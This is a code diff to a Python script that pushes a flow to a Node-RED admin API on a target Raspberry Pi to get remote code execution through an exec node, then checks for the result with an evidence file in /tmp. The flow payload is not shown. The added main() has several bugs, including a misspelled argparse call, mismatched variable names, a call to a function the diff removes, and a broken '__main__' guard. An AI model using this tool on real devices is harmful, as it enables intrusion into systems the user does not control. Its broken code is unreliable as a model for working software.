@@ -19,7 +19,7 @@ targetHost = input("Target Host: ")
 targetPort = input("Target Port: ")
 piUser = input("Target Device User: ")
 
-options = ["/flows", "/settings", "/nodes", "/context", "/subflows", "/palette"]
+options = ["flows", "settings", "nodes", "context", "subflows", "palette"]
 
 while True:
 
@@ -37,7 +37,7 @@ while True:
 
     print("Invalid option. Enter -h to see available options.")
 
-targetURL = f"http://{targetHost}:{targetPort}{targetTopic}"
+targetURL = f"http://{targetHost}:{targetPort}/{targetTopic}"
 
 nodeConfirm_File = "/tmp/RCEnodeConfirm.txt" #evidence file spawned on Pi
 
@@ -121,7 +121,7 @@ def deployTarget_Flow():
     except requests.exceptions.ConnectionError:
         print(f"{WARNING} Cannot reach {targetURL}")
         print(f"Try: Check Pi state and services")
-        sys.exit(1)
+        sys.exit(1) 
 
     print(f"{NOTIFICATION} Response: HTTP {resp.status_code} {resp.reason}")
 
@@ -140,7 +140,34 @@ def deployTarget_Flow():
         print(f"{WARNING} Unknown response {resp.status_code}: {resp.text[:200]}")
         return False
 
-def RCEverify():
-    
-
 def main():
+    parser = argparse.argumentParser()
+    parser.add_argument("--check", action="store_true")
+    parser.add_argument("--verify", action="store_true")
+    parser.add_argument("--dry-run", action="store_true")
+
+    args = parser.parse_args()
+
+    if args.dry_run:
+        print(f"{NOTIFICATION} Dry-run active - flow payload unsent")
+        print(json.dumps(flowPayload), indent=2)
+        return
+    
+    if args.check:
+        ok = authCheck()
+        if not ok:
+            sys.exit(1)
+
+    deploy = deployTarget_Flow()
+
+    if deployed and args.verify:
+        import time 
+        print(f"{Warning} Exec node booting - Wait 5 seconds")
+        time.sleep(5)
+        verifyRCE()
+
+    if deployed:
+        print("\n" + "-" * 60)
+
+if __name__ == "__main":
+    main()
